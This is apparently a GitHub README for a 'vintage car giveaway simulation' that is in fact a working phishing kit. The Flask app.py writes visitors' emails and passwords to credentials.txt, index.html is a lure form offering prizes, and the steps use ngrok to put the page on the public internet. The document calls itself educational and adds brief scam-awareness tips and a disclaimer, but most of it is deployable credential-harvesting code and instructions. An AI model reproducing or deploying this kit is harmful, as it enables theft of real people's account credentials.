# Vintage Car Giveaway Simulation Project

## **📚 Table of Contents**
- [Overview 🚗](#overview)
- [Folder Structure 🗂️](#folder-structure-️)
- [Tools and Technologies Used 🛠️](#tools-and-technologies-used-)
- [Project Steps ⚙️](#project-steps-)
  - [Setting Up the Environment ⚙️](#step-1-setting-up-the-environment-️)
  - [Designing the Giveaway Website 🌐](#step-2-designing-the-giveaway-website-)
  - [Testing with Ngrok 🚀](#step-3-testing-with-ngrok-)
  - [How to Run the Project 🖥️](#how-to-run-the-project-)
- [Screenshots 📸](#screenshots-)
- [How to Protect Yourself from Similar Scams 🛡️](#how-to-protect-yourself-from-similar-scams-️)
- [Outcome 🎯](#outcome-)
- [Disclaimer ⚠️](#disclaimer-️)

---



---

## **Overview** 🚗
This project showcases a creative and educational approach to simulating a giveaway website. It’s designed to help cybersecurity enthusiasts learn the art of creating convincing simulations in a safe and controlled environment. Think of it as a "vintage-tastic" journey where we explore how these techniques work while keeping everything ethical and fun. This project is strictly for educational purposes, folks! 🎓
## **Folder Structure** 🗂️
```
phishing_project/
│
├── app.py
├── credentials.txt
├── static/
│   ├── background.jpg
│   ├── vintage_car.jpg
│   ├── styles.css
│
├── templates/
│   ├── index.html
│   ├── thank_you.html
│   ├── contact.html
│   ├── about.html
```
---

## **Tools and Technologies Used** 🛠️

### **1. Tools and Software**:
- **Flask (Python Framework):** The backbone for building and running the giveaway website backend.
- **Ngrok:** Allows exposing the local Flask app to the internet for testing.
- **Visual Studio Code:** Our go-to editor for crafting the code.

### **2. Images and Design**:
- **Vintage Car Enthusiasts Theme:** Inspired by vintage car lovers and enthusiasts.
- **Custom Images:** Backgrounds and car-themed visuals.

---

## **Project Steps** ⚙️

### **Step 1: Setting Up the Environment** ⚙️
1. Install Python dependencies:
   ```bash
   pip install flask
   ```
2. Create a virtual environment:
   ```bash
   python3 -m venv myenv
   source myenv/bin/activate
   ```

---

### **Step 2: Designing the Giveaway Website** 🌐

#### **Website Content:**
The website is designed to appear as a professional giveaway site for vintage car enthusiasts. Below is a breakdown of the implementation.

**app.py:**
```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('credentials.txt', 'a') as file:
        file.write(f'Email: {email}, Password: {password}\n')
    return render_template('thank_you.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/about')
def about():
    return render_template('about.html')

if __name__ == '__main__':
    app.run(debug=True)
```

**index.html:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vintage Car Giveaway</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <header>
            <nav>
                <a href="/">Home</a>
                <a href="/about">About Us</a>
                <a href="/contact">Contact</a>
            </nav>
            <h1>🚗 Vintage Car Enthusiasts Giveaway 🚗</h1>
        </header>
        <main>
            <img src="{{ url_for('static', filename='vintage_car.jpg') }}" alt="Vintage Cars" class="decorative-image">
            <p>Welcome to the ultimate giveaway for vintage car lovers! Enter your details below for a chance to win:</p>
            <ul>
                <li>🔧 A Limited-Edition Mechanical Toolset</li>
                <li>🚗 A Vintage Car Miniature Model</li>
                <li>💳 A $100 Gift Card for Your Next Car Maintenance</li>
            </ul>
            <form action="/submit" method="POST">
                <label for="email">Your Email:</label>
                <input type="text" id="email" name="email" placeholder="Enter your email" required>

                <label for="password">Create a Password:</label>
                <input type="password" id="password" name="password" placeholder="Enter a secure password" required>

                <button type="submit">Join the Giveaway</button>
            </form>
        </main>
        <footer>
            <p>Powered by Vintage Car Community | We ❤️ Classic Cars!</p>
        </footer>
    </div>
</body>
</html>
```

---

### **Step 3: Testing with Ngrok** 🚀
1. Install Ngrok to expose the local Flask app:
   ```bash
   ngrok http 5000
   ```
2. Use the generated Ngrok URL (e.g., `https://abc123.ngrok-free.app`) to access the website externally.

---

### **How to Run the Project** 🖥️

1. **Open a Terminal**  
   Open your terminal on macOS or the appropriate terminal on your operating system.

2. **Start Ngrok**  
   Use the following command to expose your Flask app to the internet:
   ```bash
   ngrok http 5000
   ```
   - This will create a public URL (e.g., `https://abc123.ngrok-free.app`) that you can use to access your website.

3. **Navigate to Your Project Directory**  
   In a **new terminal window**, go to the directory where your project is saved. For example:
   ```bash
   cd /path/to/your/project
   ```

4. **Activate the Python Virtual Environment**  
   Activate your virtual environment by running:
   ```bash
   source myenv/bin/activate
   ```
   If you’re on Windows, use:
   ```cmd
   myenv\Scripts\activate
   ```

5. **Install Required Dependencies** (First-time setup only)  
   If you haven’t already installed the required Python packages, run:
   ```bash
   pip install flask
   ```

6. **Run the Flask Application**  
   Start your Flask app with the following command:
   ```bash
   python3 app.py
   ```
   This will host your application locally on `http://127.0.0.1:5000`.

7. **Access Your Website via Ngrok**  
   Copy the public URL generated by **ngrok** (e.g., `https://abc123.ngrok-free.app`) and open it in your browser. This will take you to your giveaway simulation website.

8. **Stop the Project**
   - To stop your application:
     1. Press `CTRL+C` in the terminal running `python3 app.py`.
     2. Close the terminal running **ngrok**.

---

## **Screenshots** 📸

### **1. Landing Page:**

<img width="1440" alt="LandingPage" src="https://github.com/user-attachments/assets/32303049-c00e-428d-a9ef-7f0485072a7a" />

### **2. Success Login Page:**

<img width="1440" alt="Thank_youPage" src="https://github.com/user-attachments/assets/17def6ea-be2d-46b7-b80f-0a9fddf5e30e" />

### **3. File Structure:**

<img width="908" alt="Folder structure " src="https://github.com/user-attachments/assets/f448b5ee-3f3b-45c8-aa66-4e564ac2d68f" />

### **4. The Credentials File Where the received credentials are saved**

<img width="943" alt="credentials" src="https://github.com/user-attachments/assets/4af56c41-f226-4a21-9d96-66e776aff1f5" />

---

## **How to Protect Yourself from Similar Scams** 🛡️

### **1. Recognizing Fraudulent Giveaways:**
- **Check the Source:** Ensure the website or email is from a reputable source.
- **Avoid Suspicious Links:** Hover over links to verify their destination.
- **Beware of Too-Good-To-Be-True Offers:** Be cautious of unrealistically lucrative offers.

### **2. Preventative Measures:**
- **Enable Multi-Factor Authentication (MFA):** Adds a layer of security to your accounts.
- **Keep Software Updated:** Regular updates prevent vulnerabilities.
- **Educate Yourself:** Learn about common fraud tactics through cybersecurity resources.

---

## **Outcome** 🎯
- The giveaway website successfully captured form submissions and stored them in `credentials.txt`.
- This project provided hands-on experience in building and testing phishing-like simulations ethically.

---

## **Disclaimer** ⚠️
This project is strictly for educational purposes. Misuse of these techniques for malicious activities is illegal and unethical. Always ensure proper consent and adhere to cybersecurity laws and guidelines.

---

Enjoy the project! And remember, not every giveaway is as innocent as it seems—stay alert for scams! 😉🔎
